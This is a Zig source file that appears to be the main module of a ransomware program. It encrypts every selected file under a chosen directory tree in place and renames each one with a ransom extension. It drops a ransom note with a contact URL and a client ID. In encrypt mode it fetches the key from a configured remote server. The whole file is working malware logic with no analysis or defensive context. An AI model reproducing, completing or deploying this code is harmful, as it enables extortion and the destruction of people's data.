const build_options = @import("build_options");
const builtin = @import("builtin");
const clap = @import("clap");
const std = @import("std");
const Dir = std.fs.Dir;
const stdout = @import("./stdout.zig");
const Algorithm = @import("./alg.zig").Algorithm;
const addRansomExtension = @import("./ext.zig").addRansomExtension;
const hasRansomExtension = @import("./ext.zig").hasRansomExtension;
const removeRansomExtension = @import("./ext.zig").removeRansomExtension;
const makeRansomNote = @import("./note.zig").makeRansomNote;
const Level = @import("./level.zig").Level;
const Mode = @import("./mode.zig").Mode;
const randomBytes = @import("./util.zig").randomBytes;
const randomNumbers = @import("./util.zig").randomNumbers;
const downloadKeyFromServer = @import("./connect.zig").downloadKeyFromServer;

// Build options
const OPTION_ALG: []const u8 = build_options.alg;
const OPTION_SERVER_HOST: []const u8 = build_options.server_host;
const OPTION_SERVER_PORT: u16 = build_options.server_port;
const OPTION_SERVER_PATH: []const u8 = build_options.server_path;
const OPTION_CONTACT_URL: []const u8 = build_options.contact_url;
const OPTION_LEVEL: usize = build_options.level;

fn processFile(
    mode: Mode,
    level: Level,
    alg: Algorithm,
    key: []u8,
    path: []const u8,
) !void {
    const allocator = std.heap.page_allocator;

    const cwd_path = try std.fs.cwd().realpathAlloc(allocator, ".");
    defer allocator.free(cwd_path);
    const abs_path = try std.fs.path.resolve(
        allocator,
        &.{
            cwd_path,
            path,
        },
    );
    defer allocator.free(abs_path);

    var file = try std.fs.cwd().openFile(abs_path, .{ .mode = .read_write });
    defer file.close();
    const file_size = try file.getEndPos();
    const buf = try allocator.alloc(u8, file_size);
    defer allocator.free(buf);
    _ = try file.readAll(buf);

    switch (mode) {
        .decrypt => {
            if (hasRansomExtension(abs_path)) {
                const out = try alg.decrypt(buf, key);
                var new_file = try std.fs.cwd().createFile(abs_path, .{ .truncate = true });
                defer new_file.close();
                try new_file.writeAll(out);
                try removeRansomExtension(abs_path);
            }
        },
        .encrypt => {
            if (!hasRansomExtension(abs_path) and level.shouldEncrypt(abs_path)) {
                const out = try alg.encrypt(buf, key);
                var new_file = try std.fs.cwd().createFile(abs_path, .{ .truncate = true });
                defer new_file.close();
                try new_file.writeAll(out);
                try addRansomExtension(abs_path);
            }
        },
    }
}

fn recurse(
    mode: Mode,
    level: Level,
    alg: Algorithm,
    key: []u8,
    dir: *Dir,
    dir_path: []const u8,
) !void {
    const allocator = std.heap.page_allocator;

    var it = dir.iterate();
    while (try it.next()) |entry| {
        const entry_path = try std.fs.path.join(
            allocator,
            &.{ @constCast(dir_path), @constCast(entry.name) },
        );
        switch (entry.kind) {
            .file => try processFile(mode, level, alg, key, entry_path),
            .directory => {
                var subdir = try std.fs.cwd().openDir(entry_path, .{ .iterate = true });
                defer subdir.close();
                try recurse(mode, level, alg, key, &subdir, entry_path);
            },
            else => {},
        }
    }
}

pub fn run(
    mode: Mode,
    level: Level,
    alg: Algorithm,
    key: []u8,
    dir_path: []const u8,
    client_id: usize,
) !void {
    var dir = try std.fs.cwd().openDir(dir_path, .{ .iterate = true });
    defer dir.close();
    try recurse(mode, level, alg, key, &dir, dir_path);

    if (mode == .encrypt) try makeRansomNote(
        dir_path,
        OPTION_CONTACT_URL,
        client_id,
    );
}

pub fn main() !void {
    const alg = try Algorithm.init(OPTION_ALG);
    const level = try Level.init(OPTION_LEVEL);

    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();

    const params = comptime clap.parseParamsComptime(
        \\-h, --help                Display the usage.
        \\-d, --decrypt             Decrypt files under the specified directory.
        \\-g, --genkey              Generate a random key with Base64-encoding.
        \\-e, --encrypt             Encrypt files under the specified directory.
        \\-k, --key         <STR>   Base64-encoded secret key for decryption.
        \\<DIR>...
    );

    const parsers = comptime .{
        .DIR = clap.parsers.string,
        .STR = clap.parsers.string,
    };

    var diag = clap.Diagnostic{};
    var res = clap.parse(clap.Help, &params, parsers, .{
        .diagnostic = &diag,
        .allocator = gpa.allocator(),
    }) catch |err| {
        diag.report(std.io.getStdErr().writer(), err) catch {};
        return err;
    };
    defer res.deinit();

    if (res.args.help != 0) {
        return clap.help(std.io.getStdErr().writer(), clap.Help, &params, .{});
    }

    if (res.args.genkey != 0) {
        // Generate random key.
        const key = try randomBytes(try alg.getKeySize());
        // Base64-encode.
        var buffer: [0x100]u8 = undefined;
        const key_b64 = std.base64.standard.Encoder.encode(&buffer, key);
        return stdout.print("{s}\n", .{key_b64});
    }

    if (res.positionals.len == 0) {
        return stdout.print("Error: A directory path is not specified.\n", .{});
    }
    const dir_path = res.positionals[0];

    // Create a client ID
    const client_id = try randomNumbers();

    var key: []u8 = undefined;

    var mode: Mode = undefined;
    if (res.args.decrypt != 0) {
        mode = Mode.decrypt;

        if (res.args.key == null) {
            return stdout.print("Error: Secret key is required for decryption.\n", .{});
        }
        const key_b64 = res.args.key.?;
        // Base64-decode the key.
        var buffer: [0x100]u8 = undefined;
        const key_decoded = buffer[0..try std.base64.standard.Decoder.calcSizeForSlice(key_b64)];
        try std.base64.standard.Decoder.decode(key_decoded, key_b64);
        key = key_decoded;
    } else if (res.args.encrypt != 0) {
        mode = Mode.encrypt;
        const key_b64 = try downloadKeyFromServer(
            OPTION_SERVER_HOST,
            OPTION_SERVER_PORT,
            OPTION_SERVER_PATH,
            client_id,
        );
        // Base64-decode the key.
        var buffer: [0x100]u8 = undefined;
        const key_decoded = buffer[0..try std.base64.standard.Decoder.calcSizeForSlice(key_b64)];
        try std.base64.standard.Decoder.decode(key_decoded, key_b64);
        key = key_decoded;
    } else {
        return stdout.print("Specify the flag '-d/--decrypt' or '-e/--encrypt'.\n", .{});
    }

    try run(mode, level, alg, key, dir_path, client_id);
}
